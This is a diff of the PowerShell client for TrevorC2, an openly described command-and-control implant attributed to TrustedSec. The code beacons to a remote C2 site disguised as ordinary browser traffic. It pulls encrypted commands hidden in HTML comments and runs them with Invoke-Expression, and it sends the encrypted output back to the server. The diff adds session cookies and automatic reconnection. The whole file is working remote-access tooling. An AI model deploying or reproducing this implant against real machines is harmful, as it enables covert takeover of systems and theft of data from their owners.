@@ -1,11 +1,11 @@
 #
-# TrevorC2 - legitimate looking command and control 
+# TrevorC2 - legitimate looking command and control
 # Written by: Dave Kennedy @HackingDave
 # Website: https://www.trustedsec.com
 # GIT: https://github.com/trustedsec
 # PowerShell Module by Alex Williams @offsec_ginger
 #
-# This is the client connection, and only an example. Refer to the readme 
+# This is the client connection, and only an example. Refer to the readme
 # to build your own client connection to the server C2 infrastructure.
 # CONFIG CONSTANTS:
 # Site used to communicate with (remote TrevorC2 site)
@@ -79,36 +79,44 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 function random_interval {
     Get-Random -minimum $time_interval1 -maximum $time_interval2
 }
-while ($True) {
-    $time = random_interval
 
-    try {
+$cookiecontainer = New-Object System.Net.CookieContainer
+
+function connect-trevor {
+    while ($True) {
+        $time = random_interval
+
+        try {
             $HOSTNAME = "magic_hostname=$env:computername"
-			$key = Create-AesKey
+            $key = Create-AesKey
             $SEND = Encrypt-String $key $HOSTNAME
             $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
             $SEND = [System.Convert]::ToBase64String($s)
             $r = [System.Net.HTTPWebRequest]::Create($SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND)
+            $r.CookieContainer = $cookiecontainer
             $r.Method = "GET"
             $r.KeepAlive = $false
             $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
             $r.Headers.Add("Accept-Encoding", "identity");
             $resp = $r.GetResponse()
-            break 
-    }
-    
-    catch [System.Management.Automation.MethodInvocationException] {
-        Write-Host "[*] Cannot connect to '$SITE_URL'" -Foreground Red
-        Write-Host "[*] Trying again in $time seconds..." -Foreground Yellow
-        sleep $time
-        Continue
+            break
+        }
+        catch [System.Management.Automation.MethodInvocationException] {
+            Write-Host "[*] Cannot connect to '$SITE_URL'" -Foreground Red
+            Write-Host "[*] Trying again in $time seconds..." -Foreground Yellow
+            sleep $time
+            Continue
         }
     }
+}
+
+connect-trevor
 
 while ($True) {
     $time = random_interval
     try {
         $r = [System.Net.HTTPWebRequest]::Create($SITE_URL + $ROOT_PATH_QUERY)
+        $r.CookieContainer = $cookiecontainer
         $r.Method = "GET"
         $r.KeepAlive = $false
         $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
@@ -116,7 +124,7 @@ while ($True) {
         $resp = $r.GetResponse()
         $reqstream = $resp.GetResponseStream()
         $sr = New-Object System.IO.StreamReader $reqstream
-        $ENCRYPTEDSTREAM = $sr.ReadToEnd() -split("`n") | Select-String "<!-- $STUB" 
+        $ENCRYPTEDSTREAM = $sr.ReadToEnd() -split("`n") | Select-String "<!-- $STUB"
         $ENCRYPTED = $ENCRYPTEDSTREAM -split("<!-- $STUB")
         $ENCRYPTED = $ENCRYPTED[1] -split(" --></body>")
         $key = Create-AesKey
@@ -124,15 +132,21 @@ while ($True) {
         if ($DECRYPTED -eq "nothing"){
             sleep $time
         }
-        else{ 
+        else{
             if ($DECRYPTED -like $env:computername + "*"){
                 $DECRYPTED = $DECRYPTED -split($env:computername + "::::")
-                $RUN = (cmd /Q /c $DECRYPTED 2>&1 ) | Out-String
+                try {
+                    $RUN = "$DECRYPTED" | IEX -ErrorAction stop | Out-String
+                }
+                catch {
+                    $RUN = $_ | out-string
+                }
                 $RUN = ($env:computername + "::::" + $RUN)
                 $SEND = Encrypt-String $key $RUN
                 $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
                 $SEND = [System.Convert]::ToBase64String($s)
                 $r = [System.Net.HTTPWebRequest]::Create($SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND)
+                $r.CookieContainer = $cookiecontainer
                 $r.Method = "GET"
                 $r.KeepAlive = $false
                 $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
@@ -140,13 +154,14 @@ while ($True) {
                 $resp = $r.GetResponse()
                 sleep $time
 
-                }
             }
+        }
     }
     catch [System.Management.Automation.MethodInvocationException] {
         Write-Host "[*] Cannot connect to '$SITE_URL'" -Foreground Red
         Write-Host "[*] Trying again in $time seconds..." -Foreground Yellow
         sleep $time
+        connect-trevor
         Continue
-    }  
+    }
 }
